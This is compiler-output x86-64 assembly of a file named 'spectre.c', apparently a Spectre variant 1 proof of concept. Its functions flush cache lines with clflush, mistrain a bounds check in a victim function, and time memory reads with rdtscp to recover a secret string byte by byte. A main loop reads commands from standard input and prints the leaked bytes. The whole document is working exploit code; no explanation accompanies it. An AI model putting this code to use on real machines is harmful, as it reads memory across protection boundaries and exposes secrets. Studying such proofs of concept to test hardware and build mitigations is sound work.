	.text
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	movslq	array1_size(%rip), %rcx
	xorl	%eax, %eax
	cmpq	%rdi, %rcx
	seta	%al
	retq
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	movslq	array1_size(%rip), %rax
	cmpq	%rdi, %rax
	jbe	.LBB1_10
# %bb.1:
	movl	%edi, %r8d
	addl	$-1, %r8d
	js	.LBB1_10
# %bb.2:
	movb	temp(%rip), %al
	andl	$3, %edi
	je	.LBB1_3
# %bb.4:
	leaq	array1(%rip), %r9
	leaq	array2(%rip), %rdx
	movl	%r8d, %ecx
	.p2align	4, 0x90
.LBB1_5:                                # =>This Inner Loop Header: Depth=1
	movl	%ecx, %esi
	movzbl	(%rsi,%r9), %esi
	shlq	$9, %rsi
	andb	(%rsi,%rdx), %al
	addl	$-1, %ecx
	addl	$-1, %edi
	jne	.LBB1_5
# %bb.6:
	cmpl	$3, %r8d
	jae	.LBB1_7
	jmp	.LBB1_9
.LBB1_3:
	movl	%r8d, %ecx
	cmpl	$3, %r8d
	jb	.LBB1_9
.LBB1_7:
	leaq	array1(%rip), %rdx
	leaq	array2(%rip), %rsi
	.p2align	4, 0x90
.LBB1_8:                                # =>This Inner Loop Header: Depth=1
	movl	%ecx, %edi
	movzbl	(%rdi,%rdx), %edi
	shlq	$9, %rdi
	andb	(%rdi,%rsi), %al
	leal	-1(%rcx), %edi
	movzbl	(%rdi,%rdx), %edi
	shlq	$9, %rdi
	andb	(%rdi,%rsi), %al
	leal	-2(%rcx), %edi
	movzbl	(%rdi,%rdx), %edi
	shlq	$9, %rdi
	andb	(%rdi,%rsi), %al
	leal	-3(%rcx), %edi
	movzbl	(%rdi,%rdx), %edi
	shlq	$9, %rdi
	andb	(%rdi,%rsi), %al
	leal	-4(%rcx), %edi
	cmpl	$3, %ecx
	movl	%edi, %ecx
	jg	.LBB1_8
.LBB1_9:
	movb	%al, temp(%rip)
.LBB1_10:
	retq
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	pushq	%r15
	.cfi_def_cfa_offset 24
	pushq	%r14
	.cfi_def_cfa_offset 32
	pushq	%r13
	.cfi_def_cfa_offset 40
	pushq	%r12
	.cfi_def_cfa_offset 48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	subq	$24, %rsp
	.cfi_def_cfa_offset 80
	.cfi_offset %rbx, -56
	.cfi_offset %r12, -48
	.cfi_offset %r13, -40
	.cfi_offset %r14, -32
	.cfi_offset %r15, -24
	.cfi_offset %rbp, -16
	movq	%rdi, 16(%rsp)                  # 8-byte Spill
	leaq	results(%rip), %r14
	movl	$1024, %edx                     # imm = 0x400
	movq	%r14, %rdi
	xorl	%esi, %esi
	callq	memset@PLT
	movl	$999, %eax                      # imm = 0x3E7
	leaq	array2(%rip), %r12
	jmp	.LBB2_1
	.p2align	4, 0x90
.LBB2_11:                               #   in Loop: Header=BB2_1 Depth=1
	leal	-1(%r8), %eax
	cmpl	$1, %r8d
                                        # kill: def $eax killed $eax def $rax
	jbe	.LBB2_12
.LBB2_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_2 Depth 2
                                        #     Child Loop BB2_4 Depth 2
                                        #       Child Loop BB2_13 Depth 3
                                        #     Child Loop BB2_7 Depth 2
	movq	%r14, %rbx
	xorl	%ecx, %ecx
	.p2align	4, 0x90
.LBB2_2:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	(%rcx,%r12)
	clflush	512(%rcx,%r12)
	clflush	1024(%rcx,%r12)
	clflush	1536(%rcx,%r12)
	clflush	2048(%rcx,%r12)
	clflush	2560(%rcx,%r12)
	clflush	3072(%rcx,%r12)
	clflush	3584(%rcx,%r12)
	addq	$4096, %rcx                     # imm = 0x1000
	cmpq	$131072, %rcx                   # imm = 0x20000
	jne	.LBB2_2
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	movq	%rax, %rbp
                                        # kill: def $eax killed $eax killed $rax
	cltd
	idivl	array1_size(%rip)
	movl	%edx, %r15d
	movq	%r15, %r13
	xorq	16(%rsp), %r13                  # 8-byte Folded Reload
	movl	$29, %r14d
	jmp	.LBB2_4
	.p2align	4, 0x90
.LBB2_5:                                #   in Loop: Header=BB2_4 Depth=2
	movl	%r14d, %eax
	movl	$2863311531, %ecx               # imm = 0xAAAAAAAB
	imulq	%rcx, %rax
	shrq	$34, %rax
	addl	%eax, %eax
	leal	(%rax,%rax,2), %eax
	notl	%eax
	addl	%r14d, %eax
	andl	$-65536, %eax                   # imm = 0xFFFF0000
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%r13, %rdi
	xorq	%r15, %rdi
	callq	victim_function
	subl	$1, %r14d
	jb	.LBB2_6
.LBB2_4:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_13 Depth 3
	clflush	array1_size(%rip)
	movl	$0, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$99, %eax
	jg	.LBB2_5
	.p2align	4, 0x90
.LBB2_13:                               #   Parent Loop BB2_1 Depth=1
                                        #     Parent Loop BB2_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	addl	$1, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$100, %eax
	jl	.LBB2_13
	jmp	.LBB2_5
	.p2align	4, 0x90
.LBB2_6:                                #   in Loop: Header=BB2_1 Depth=1
	movl	$13, %edi
	movq	%rbx, %r14
	movq	%rbp, %r8
	leaq	array1(%rip), %r9
	jmp	.LBB2_7
	.p2align	4, 0x90
.LBB2_10:                               #   in Loop: Header=BB2_7 Depth=2
	addl	$167, %edi
	cmpl	$42765, %edi                    # imm = 0xA70D
	je	.LBB2_11
.LBB2_7:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movzbl	%dil, %ebx
	movq	%rbx, %rbp
	shlq	$9, %rbp
	rdtscp
	movq	%rdx, %rsi
	shlq	$32, %rsi
	orq	%rax, %rsi
	movzbl	(%rbp,%r12), %eax
	rdtscp
	shlq	$32, %rdx
	orq	%rax, %rdx
	subq	%rsi, %rdx
	cmpq	$50, %rdx
	ja	.LBB2_10
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	movl	%r8d, %eax
	cltd
	idivl	array1_size(%rip)
                                        # kill: def $edx killed $edx def $rdx
	cmpb	(%rdx,%r9), %dil
	je	.LBB2_10
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	movl	%ebx, %eax
	addl	$1, (%r14,%rax,4)
	jmp	.LBB2_10
.LBB2_12:
	xorl	%ecx, results(%rip)
	addq	$24, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%r12
	.cfi_def_cfa_offset 40
	popq	%r13
	.cfi_def_cfa_offset 32
	popq	%r14
	.cfi_def_cfa_offset 24
	popq	%r15
	.cfi_def_cfa_offset 16
	popq	%rbp
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	pushq	%r15
	.cfi_def_cfa_offset 24
	pushq	%r14
	.cfi_def_cfa_offset 32
	pushq	%r13
	.cfi_def_cfa_offset 40
	pushq	%r12
	.cfi_def_cfa_offset 48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	subq	$56, %rsp
	.cfi_def_cfa_offset 112
	.cfi_offset %rbx, -56
	.cfi_offset %r12, -48
	.cfi_offset %r13, -40
	.cfi_offset %r14, -32
	.cfi_offset %r15, -24
	.cfi_offset %rbp, -16
	movq	%rsi, 32(%rsp)                  # 8-byte Spill
	movl	%edi, 28(%rsp)                  # 4-byte Spill
	movq	stdin@GOTPCREL(%rip), %rbx
	leaq	array1(%rip), %r15
	leaq	array2(%rip), %r14
	leaq	results(%rip), %r12
	jmp	.LBB3_1
	.p2align	4, 0x90
.LBB3_28:                               #   in Loop: Header=BB3_1 Depth=1
	xorl	%eax, %eax
	callq	getpid@PLT
	leaq	.L.str.9(%rip), %rdi
	leaq	check+33(%rip), %rsi
	movl	%eax, %edx
	xorl	%eax, %eax
	callq	printf@PLT
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_8 Depth 2
                                        #       Child Loop BB3_9 Depth 3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_30 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #       Child Loop BB3_24 Depth 3
	movq	(%rbx), %rdi
	callq	getc@PLT
	shll	$24, %eax
	cmpl	$167772160, %eax                # imm = 0xA000000
	je	.LBB3_1
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$1761607680, %eax               # imm = 0x69000000
	je	.LBB3_28
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$1912602624, %eax               # imm = 0x72000000
	jne	.LBB3_29
# %bb.4:                                #   in Loop: Header=BB3_1 Depth=1
	movq	secret(%rip), %rdx
	leaq	.L.str.1(%rip), %rdi
	movq	%rdx, %rsi
	xorl	%eax, %eax
	callq	printf@PLT
	movq	secret(%rip), %rdi
	movq	%rdi, %rax
	subq	%r15, %rax
	movq	%rax, 16(%rsp)
	callq	strlen@PLT
	movq	%rax, %rbp
	movl	%ebp, 8(%rsp)
	movl	$131072, %edx                   # imm = 0x20000
	movq	%r14, %rdi
	movl	$1, %esi
	callq	memset@PLT
	cmpl	$3, 28(%rsp)                    # 4-byte Folded Reload
	jne	.LBB3_6
# %bb.5:                                #   in Loop: Header=BB3_1 Depth=1
	movq	32(%rsp), %rbx                  # 8-byte Reload
	movq	8(%rbx), %rdi
	leaq	.L.str.2(%rip), %rsi
	leaq	16(%rsp), %rdx
	xorl	%eax, %eax
	callq	__isoc99_sscanf@PLT
	subq	%r15, 16(%rsp)
	movq	16(%rbx), %rdi
	leaq	.L.str.3(%rip), %rsi
	leaq	8(%rsp), %rdx
	xorl	%eax, %eax
	callq	__isoc99_sscanf@PLT
	movq	16(%rsp), %rsi
	movl	8(%rsp), %edx
	leaq	.L.str.4(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	movl	8(%rsp), %ebp
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	leaq	.L.str.5(%rip), %rdi
	movl	%ebp, %esi
	xorl	%eax, %eax
	callq	printf@PLT
	movl	8(%rsp), %eax
	leal	-1(%rax), %ecx
	movl	%ecx, 8(%rsp)
	testl	%eax, %eax
	jle	.LBB3_27
# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
	xorl	%ebx, %ebx
	jmp	.LBB3_8
	.p2align	4, 0x90
.LBB3_26:                               #   in Loop: Header=BB3_8 Depth=2
	movq	40(%rsp), %rbx                  # 8-byte Reload
	addq	$1, %rbx
	movl	$10, %edi
	callq	putchar@PLT
	movl	8(%rsp), %eax
	leal	-1(%rax), %ecx
	movl	%ecx, 8(%rsp)
	testl	%eax, %eax
	jle	.LBB3_27
.LBB3_8:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_9 Depth 3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_30 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #       Child Loop BB3_24 Depth 3
	movq	16(%rsp), %rsi
	movq	secret(%rip), %rax
	movq	%rbx, 40(%rsp)                  # 8-byte Spill
	movsbl	(%rax,%rbx), %ecx
	leaq	.L.str.6(%rip), %rdi
	movl	%ecx, %edx
	xorl	%eax, %eax
	callq	printf@PLT
	movq	16(%rsp), %rax
	movq	%rax, 48(%rsp)                  # 8-byte Spill
	addq	$1, %rax
	movq	%rax, 16(%rsp)
	movl	$1024, %edx                     # imm = 0x400
	movq	%r12, %rdi
	xorl	%esi, %esi
	callq	memset@PLT
	movl	$999, %r13d                     # imm = 0x3E7
	jmp	.LBB3_9
	.p2align	4, 0x90
.LBB3_19:                               #   in Loop: Header=BB3_9 Depth=3
	leal	-1(%r13), %eax
	cmpl	$1, %r13d
	movl	%eax, %r13d
	jbe	.LBB3_20
.LBB3_9:                                #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        # =>    This Loop Header: Depth=3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_30 Depth 5
                                        #         Child Loop BB3_15 Depth 4
	movq	%r15, %rbx
	xorl	%eax, %eax
	.p2align	4, 0x90
.LBB3_10:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	clflush	(%rax,%r14)
	clflush	512(%rax,%r14)
	clflush	1024(%rax,%r14)
	clflush	1536(%rax,%r14)
	clflush	2048(%rax,%r14)
	clflush	2560(%rax,%r14)
	clflush	3072(%rax,%r14)
	clflush	3584(%rax,%r14)
	addq	$4096, %rax                     # imm = 0x1000
	cmpq	$131072, %rax                   # imm = 0x20000
	jne	.LBB3_10
# %bb.11:                               #   in Loop: Header=BB3_9 Depth=3
	movl	%r13d, %eax
	cltd
	idivl	array1_size(%rip)
	movl	%edx, %ebp
	movq	48(%rsp), %r12                  # 8-byte Reload
	xorq	%rbp, %r12
	movl	$29, %r15d
	jmp	.LBB3_12
	.p2align	4, 0x90
.LBB3_13:                               #   in Loop: Header=BB3_12 Depth=4
	movl	%r15d, %eax
	movl	$2863311531, %ecx               # imm = 0xAAAAAAAB
	imulq	%rcx, %rax
	shrq	$34, %rax
	addl	%eax, %eax
	leal	(%rax,%rax,2), %eax
	notl	%eax
	addl	%r15d, %eax
	andl	$-65536, %eax                   # imm = 0xFFFF0000
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%r12, %rdi
	xorq	%rbp, %rdi
	callq	victim_function
	subl	$1, %r15d
	jb	.LBB3_14
.LBB3_12:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Loop Header: Depth=4
                                        #           Child Loop BB3_30 Depth 5
	clflush	array1_size(%rip)
	movl	$0, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$99, %eax
	jg	.LBB3_13
	.p2align	4, 0x90
.LBB3_30:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        #         Parent Loop BB3_12 Depth=4
                                        # =>        This Inner Loop Header: Depth=5
	addl	$1, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$100, %eax
	jl	.LBB3_30
	jmp	.LBB3_13
	.p2align	4, 0x90
.LBB3_14:                               #   in Loop: Header=BB3_9 Depth=3
	movl	$13, %edi
	movq	%rbx, %r15
	leaq	results(%rip), %r12
	jmp	.LBB3_15
	.p2align	4, 0x90
.LBB3_18:                               #   in Loop: Header=BB3_15 Depth=4
	addl	$167, %edi
	cmpl	$42765, %edi                    # imm = 0xA70D
	je	.LBB3_19
.LBB3_15:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	movzbl	%dil, %ebx
	movq	%rbx, %rbp
	shlq	$9, %rbp
	rdtscp
	movq	%rdx, %rsi
	shlq	$32, %rsi
	orq	%rax, %rsi
	movzbl	(%rbp,%r14), %eax
	rdtscp
	shlq	$32, %rdx
	orq	%rax, %rdx
	subq	%rsi, %rdx
	cmpq	$50, %rdx
	ja	.LBB3_18
# %bb.16:                               #   in Loop: Header=BB3_15 Depth=4
	movl	%r13d, %eax
	cltd
	idivl	array1_size(%rip)
                                        # kill: def $edx killed $edx def $rdx
	cmpb	(%rdx,%r15), %dil
	je	.LBB3_18
# %bb.17:                               #   in Loop: Header=BB3_15 Depth=4
	movl	%ebx, %eax
	addl	$1, (%r12,%rax,4)
	jmp	.LBB3_18
	.p2align	4, 0x90
.LBB3_20:                               #   in Loop: Header=BB3_8 Depth=2
	xorl	results(%rip), %ecx
	movl	%ecx, results(%rip)
	xorl	%ebp, %ebp
	leaq	.L.str.7(%rip), %rbx
	movl	%ecx, %eax
	subl	4(%r12,%rbp,4), %eax
	jle	.LBB3_24
	.p2align	4, 0x90
.LBB3_22:                               #   in Loop: Header=BB3_8 Depth=2
	cmpl	$101, %eax
	jl	.LBB3_24
# %bb.23:                               #   in Loop: Header=BB3_8 Depth=2
	movq	%rbx, %rdi
	movl	%ebp, %esi
	movl	%ecx, %edx
	xorl	%eax, %eax
	callq	printf@PLT
	movl	4(%r12,%rbp,4), %edx
	leal	1(%rbp), %esi
	movq	%rbx, %rdi
	xorl	%eax, %eax
	callq	printf@PLT
.LBB3_24:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	cmpq	$254, %rbp
	je	.LBB3_26
# %bb.25:                               #   in Loop: Header=BB3_24 Depth=3
	movl	4(%r12,%rbp,4), %ecx
	addq	$1, %rbp
	movl	%ecx, %eax
	subl	4(%r12,%rbp,4), %eax
	jg	.LBB3_22
	jmp	.LBB3_24
	.p2align	4, 0x90
.LBB3_27:                               #   in Loop: Header=BB3_1 Depth=1
	movq	stdin@GOTPCREL(%rip), %rbx
	jmp	.LBB3_1
.LBB3_29:
	xorl	%eax, %eax
	addq	$56, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%r12
	.cfi_def_cfa_offset 40
	popq	%r13
	.cfi_def_cfa_offset 32
	popq	%r14
	.cfi_def_cfa_offset 24
	popq	%r15
	.cfi_def_cfa_offset 16
	popq	%rbp
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function